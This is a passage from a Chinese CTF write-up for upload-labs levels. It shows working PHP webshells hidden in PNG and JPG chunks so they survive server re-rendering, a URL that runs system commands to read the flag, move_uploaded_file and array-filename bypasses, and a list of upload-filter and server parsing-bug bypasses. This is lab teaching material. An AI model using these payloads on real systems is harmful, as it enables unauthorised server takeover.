」</p><p>../表示父级目录的文件或文件夹</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204130556.png" alt="image-20201204130556897"></p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG 二次渲染后除了文件头，其他部分全部不一致</p><h3 id="写入-PLTE-数据块"><a href="#写入-PLTE-数据块" class="headerlink" title="写入 PLTE 数据块"></a>写入 PLTE 数据块</h3><blockquote><p><a href="https://wooyun.x10sec.org/static/drops/tips-16034.html" ref="nofollow">WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a> </p><p>修改索引图像插入 PHP 代码的脚本项目地址为：<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py" ref="nofollow">Github - poc_png.py</a> </p></blockquote><p>因为只有索引图像才能将 payload 成功插入到 PLTE 数据块中</p><p>所以准备一张索引颜色的 <code>love.png</code>：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204134048.png" alt="image-20201204134048514"></p><p>使用上面的脚本生成 <code>love_shell.png</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python png_shell.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o love_shell.png love.png</span><br><span class="line"></span><br><span class="line">hexdump -C love_shell.png | head -5</span><br><span class="line">00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|</span><br><span class="line">00000010  00 00 01 68 00 00 01 68  08 03 00 00 00 4d 3b 91  |...h...h.....M;.|</span><br><span class="line">00000020  e7 00 00 03 00 50 4c 54  45 3c 3f 70 68 70 20 65  |.....PLTE&lt;?php e|</span><br><span class="line">00000030  76 61 6c 28 24 5f 52 45  51 55 45 53 54 5b 31 5d  |val(<span class="variable">$_REQUEST</span>[1]|</span><br><span class="line">00000040  29 3b 3f 3e ff ff fe ff  ff fe ff ff ff ff ff ff  |);?&gt;............|</span><br></pre></td></tr></table></figure><p>上传进行二次渲染得到 <code>1914602453.png</code></p><p>使用脚本再次生成 <code>love_shell1.png</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python png_shell.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o love_shell1.png 1914602453.png</span><br><span class="line"></span><br><span class="line">hexdump -C love_shell1.png | head -5</span><br><span class="line">00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|</span><br><span class="line">00000010  00 00 01 68 00 00 01 68  08 03 00 00 00 4d 3b 91  |...h...h.....M;.|</span><br><span class="line">00000020  e7 00 00 01 f5 50 4c 54  45 3c 3f 70 68 70 20 65  |.....PLTE&lt;?php e|</span><br><span class="line">00000030  76 61 6c 28 24 5f 52 45  51 55 45 53 54 5b 31 5d  |val(<span class="variable">$_REQUEST</span>[1]|</span><br><span class="line">00000040  29 3b 3f 3e <span class="built_in">fc</span> fb fb fd  <span class="built_in">fc</span> fd fa fa fa fb fa fa  |);?&gt;............|</span><br></pre></td></tr></table></figure><p>再次上传得到 <code>1997665874.png</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204140855.png" alt="image-20201204140855280"></p><p>读取 Flag：<code>http://127.0.0.1:30011/?file=upload/1997665874.png&amp;1=system(%27cat%20/f*%27);</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204141029.png" alt="image-20201204141029867"></p><p><strong>这里一共需要使用脚本制作两次：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204140928.png" alt="image-20201204140928170"></p><h3 id="写入IDAT数据块"><a href="#写入IDAT数据块" class="headerlink" title="写入IDAT数据块"></a>写入IDAT数据块</h3><p>新建一个 IDAT.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 命令行 <code>php IDAT.php</code> 生成 <code>shell.png</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C shell.png</span><br><span class="line">00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|</span><br><span class="line">00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 <span class="built_in">fc</span> 18 ed  |... ... ........|</span><br><span class="line">00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|</span><br><span class="line">00000030  c4 01 95 2b 0e 1b 00 00  00 60 49 44 41 54 48 89  |...+.....`IDATH.|</span><br><span class="line">00000040  63 5c 3c 3f 3d 24 5f 47  45 54 5b 30 5d 28 24 5f  |c\&lt;?=<span class="variable">$_GET</span>[0](<span class="variable">$_</span>|</span><br><span class="line">00000050  50 4f 53 54 5b 31 5d 29  3b 3f 3e 58 80 81 81 c1  |POST[1]);?&gt;X....|</span><br><span class="line">00000060  73 5e 37 93 <span class="built_in">fc</span> 8f 8b db  7e 5f d3 7d aa 27 f7 f1  |s^7.....~_.&#125;.<span class="string">&#x27;..|</span></span><br><span class="line"><span class="string">00000070  e3 c9 bf 5f ef 06 7c b2  30 30 63 d9 b9 67 fd d9  |..._..|.00c..g..|</span></span><br><span class="line"><span class="string">00000080  3d 1b ce 32 8c 82 51 30  0a 46 c1 28 18 05 a3 60  |=..2..Q0.F.(...`|</span></span><br><span class="line"><span class="string">00000090  14 8c 82 51 30 0a 86 0d  00 00 81 b2 1b 02 07 78  |...Q0..........x|</span></span><br><span class="line"><span class="string">000000a0  0d 0c 00 00 00 00 49 45  4e 44 ae 42 60 82        |......IEND.B`.|</span></span><br><span class="line"><span class="string">000000ae</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204154340.png" alt="image-20201204154340390"></p><p>上传后下载二次渲染之后的 <code>1800595762.png</code> 检验一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C 1800595762.png</span><br><span class="line">00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|</span><br><span class="line">00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 <span class="built_in">fc</span> 18 ed  |... ... ........|</span><br><span class="line">00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|</span><br><span class="line">00000030  c4 01 95 2b 0e 1b 00 00  00 60 49 44 41 54 48 89  |...+.....`IDATH.|</span><br><span class="line">00000040  63 5c 3c 3f 3d 24 5f 47  45 54 5b 30 5d 28 24 5f  |c\&lt;?=<span class="variable">$_GET</span>[0](<span class="variable">$_</span>|</span><br><span class="line">00000050  50 4f 53 54 5b 31 5d 29  3b 3f 3e 58 80 81 81 c1  |POST[1]);?&gt;X....|</span><br><span class="line">00000060  73 5e 37 93 <span class="built_in">fc</span> 8f 8b db  7e 5f d3 7d aa 27 f7 f1  |s^7.....~_.&#125;.<span class="string">&#x27;..|</span></span><br><span class="line"><span class="string">00000070  e3 c9 bf 5f ef 06 7c b2  30 30 63 d9 b9 67 fd d9  |..._..|.00c..g..|</span></span><br><span class="line"><span class="string">00000080  3d 1b ce 32 8c 82 51 30  0a 46 c1 28 18 05 a3 60  |=..2..Q0.F.(...`|</span></span><br><span class="line"><span class="string">00000090  14 8c 82 51 30 0a 86 0d  00 00 81 b2 1b 02 07 78  |...Q0..........x|</span></span><br><span class="line"><span class="string">000000a0  0d 0c 00 00 00 00 49 45  4e 44 ae 42 60 82        |......IEND.B`.|</span></span><br><span class="line"><span class="string">000000ae</span></span><br></pre></td></tr></table></figure><p>成功绕过：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204153742.png" alt="image-20201204153736218"></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试。</p><p><strong>项目地址</strong>：<a href="https://github.com/BlackFan/jpg_payload" ref="nofollow">Github - lackFan/jpg_payload</a></p><ol><li><p>先上传 <code>sheep.jpg</code></p></li><li><p>下载渲染后的 <code>518422027.jpg</code></p></li><li><p>使用 <code>jpg_payload.php</code> 脚本插入 payload </p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改脚本第一行的 payload：</span></span><br><span class="line">$miniPayload = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行执行</span></span><br><span class="line">php jpg_payload.php <span class="number">518422027.</span>jpg</span><br><span class="line">Success!%</span><br></pre></td></tr></table></figure><ol start="4"><li>上传脚本处理后的 <code>payload_518422027.jpg</code></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204164848.png" alt="image-20201204164848428"></p><ol start="5"><li>二次渲染后得到 <code>596614187.jpg</code></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204164736.png" alt="image-20201204164736907"></p><ol start="6"><li>检查一下 payload 还在不在：</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204165036.png" alt="image-20201204165036283"></p><ol start="7"><li>成功执行 <code>ls /</code> 命令：</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204163013.png" alt="image-20201204163013249"></p><blockquote><p>注意需要被服务端 imagecreatefromjpeg 渲染后再用脚本插入 payload</p></blockquote><hr><h1 id="30012-move-uploaded-file-绕过"><a href="#30012-move-uploaded-file-绕过" class="headerlink" title="30012 - move_uploaded_file 绕过"></a>30012 - move_uploaded_file 绕过</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204165400.png" alt="image-20201204165400409"></p><h2 id="本关特征-11"><a href="#本关特征-11" class="headerlink" title="本关特征"></a>本关特征</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($temp_file, $img_path)</span><br></pre></td></tr></table></figure><p>当 <code>$img_path</code> 可控的时候，还会忽略掉 <code>$img_path</code> 后面的 <code>/.</code>  可直接 Getshell</p><h2 id="Bypass-11"><a href="#Bypass-11" class="headerlink" title="Bypass"></a>Bypass</h2><p>保存文件名称为 <code>x.php/.</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204170251.png" alt="image-20201204170251449"></p><p>读一下 Flag：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204170326.png" alt="image-20201204170326145"></p><hr><h1 id="30013-代码审计绕过"><a href="#30013-代码审计绕过" class="headerlink" title="30013 - 代码审计绕过"></a>30013 - 代码审计绕过</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204171422.png" alt="image-20201204171421931"></p><h2 id="本关特征-12"><a href="#本关特征-12" class="headerlink" title="本关特征"></a>本关特征</h2><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看第一个判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以必须保证我们上传的表单 MIME 类型一定要符合标准。</p><p>接着对我们提交的 sava_name 的字符串进行处理，如果不是数组的话就以 <code>.</code>为分隔，打散为数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">  $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是<strong>数组的话就无需打散</strong>，这里比较关键，后面再详细说，先记着。</p><p>因为打散后会校验最后的后缀：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ext = end($file);</span><br><span class="line">$allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是合法后缀的话直接就报错了，所以我们老老实实的传入合法的字符串类型的不行的，这里的传入一个数组。比如这样的数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = [<span class="number">0</span>=&gt;<span class="string">&#x27;shell.php/&#x27;</span>, <span class="number">2</span>=&gt;<span class="string">&#x27;png&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这样执行完最后的拼接文件名的代码后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">$file_name = <span class="string">&#x27;shell.php/&#x27;</span> . <span class="string">&#x27;.&#x27;</span> . $file[<span class="number">2</span> - <span class="number">1</span>]; = <span class="string">&#x27;shell.php/&#x27;</span>.<span class="string">&#x27;&#x27;</span> = <span class="string">&#x27;shell.php/.&#x27;</span></span><br></pre></td></tr></table></figure><p>这样最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($temp_file, $img_path)</span><br><span class="line">move_uploaded_file($temp_file, <span class="string">&#x27;xx/xx/shell/php/.&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>结合前面的 move_uploaded_file 函数缺陷，会忽略掉文件末尾的 <code>/.</code>，所以最终就可以成功将 webshell 上传。</p><h2 id="Bypass-12"><a href="#Bypass-12" class="headerlink" title="Bypass"></a>Bypass</h2><p>抓包构造数据包：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204171909.png" alt="image-20201204171908967"></p><p>上传成功：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204172027.png" alt="image-20201204172027238"></p><hr><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p> <strong>文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</strong></p><h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><p><strong>上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤， 就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</strong></p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li><strong>首先，上传的文件能够被 Web 容器解释执行。所以文件上传后所在的目录要是 Web 容器所覆盖到的路径。</strong></li><li><strong>其次，用户能够从 Web 上访问这个文件。如果文件上传了，但用户无法通过 Web 访问，或者无法使得 Web容器解释这个脚本，那么也不能称之为漏洞。</strong></li><li><strong>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</strong></li></ul><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p><strong>上传WebShell 控制整个网站，甚至控制服务器</strong></p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p><strong>1、严格规范文件上传处理逻辑设计，不建议先存储后判断的方式，以免引起条件竞争类漏洞。</strong><br><strong>2、严格检查上传的文件后缀名、Content-Type、文件内容等。</strong><br><strong>3、定时修复服务器端的解析类漏洞，以及文件包含类漏洞避免漏洞组合。</strong></p><h2 id="ByPass-技巧"><a href="#ByPass-技巧" class="headerlink" title="ByPass 技巧"></a>ByPass 技巧</h2><h3 id="1-客户端校验绕过"><a href="#1-客户端校验绕过" class="headerlink" title="1.客户端校验绕过"></a>1.客户端校验绕过</h3><ul><li>直接修改 js 代码或者使用抓包的方法修改请求内容绕过，可以先上传一个gif木马，通过抓包修改为 jsp/php/asp。</li><li>关闭 js 尝试绕过</li></ul><h3 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h3><ul><li>通过抓包来修改Http头的content-type绕过</li><li>图片马：<code>copy pic.jpg/b+shell.php/a shell.jpg</code></li></ul><h3 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h3><ul><li>将后缀改为<code>php.</code>  <code>php_</code>  <code>php4</code> <code>phptml</code> <code>php空格</code> 再上传</li><li>使用<code>%00</code>截断：<code>/var/www/html/upload/shell.php%00 shell.png </code> </li><li>双写绕过：上传的文件名为<code>shell.pphphp</code>，那么被替换之后就为<code>shell.php</code></li></ul><h3 id="4-htaccess文件绕过"><a href="#4-htaccess文件绕过" class="headerlink" title="4.htaccess文件绕过"></a>4.htaccess文件绕过</h3><ul><li>先上传一个名为<code>.htaccess</code>的文件，内容为：<code>AddType application/x-httpd-php .png</code></li><li>让 png 后缀的文件当做 PHP 来解析</li></ul><h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><ol><li><p><strong>IIS6.0除了将ASP后缀当做ASP进行解析的同时，当文件后缀名字为.asa .cer .cdx 也会当做asp去解析，这是因为IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx 都会调用 asp.dll</strong></p></li><li><p><strong>很多地方都会用到“;”，作用是结束，IIS6.0在这就是一个漏洞了。例如：上传a.asp;jpg，服务器就会将它作为asp去执行，但是这个文件的名称依旧是：a.asp;jpg，只是在执行的过程中，web容器解析的锅</strong></p></li><li><p><strong>另一种解析漏洞就是“/”，例如：命名为 <code>a.asp/123.jpg</code>，简单的说这相当于构建了一个新的文件夹<code>a.asp</code>，凡是这个里的文件都会以asp去执行（&lt;7.5都有）</strong></p></li></ol><h2 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h2><p><strong>Nginx &lt;=0.8.37</strong></p><p>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上.php会将 /xx.jpg.php 解析为 php 文件。</p><p>（站长评论：从 /test.jpg/x.php 演变过来的，具体可以参考：Ngnix 空字节可远程执行代码漏洞）</p><h2 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h2><p>CGI简单的说，可以理解为是web服务器和独立程序之间的管家：服务器将a类型文件，交给CGI，CGI交给处理a类型文件的程序。</p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><ol><li><strong>上传图片马，不用改变图片马的名称，假如上传<code>1.jpg</code></strong></li><li><strong>访问图片马文件位置，比如<code>www.aaa.com/bbb/ccc/1.jpg</code></strong></li><li><strong>在文件路径补充：“/.php”，即<code>www.aaa.com/bbb/ccc/1.jpg/.php</code></strong></li><li><strong>访问该路径验证：<code>www.aaa.com/bbb/ccc/1.jpg/.php=phpinfo();</code></strong></li></ol><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>CGI一看是php后缀结尾，便给php程序去执行，php去找名字为“ 1.jpg”的文件夹，没找到，便去找“1.jpg”的文件，找到后执行。</strong></p><p><strong>漏洞本质：少了在次检测的环节。</strong></p><hr><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong>国光的保姆级 WriteUp：</strong></p><p><strong><a href="https://github.com/sqlsec/upload-labs-docker/blob/main/WP.md">https://github.com/sqlsec/upload-labs-docker/blob/main/WP.md</a></strong></p>]]></content>
    
    
      
      
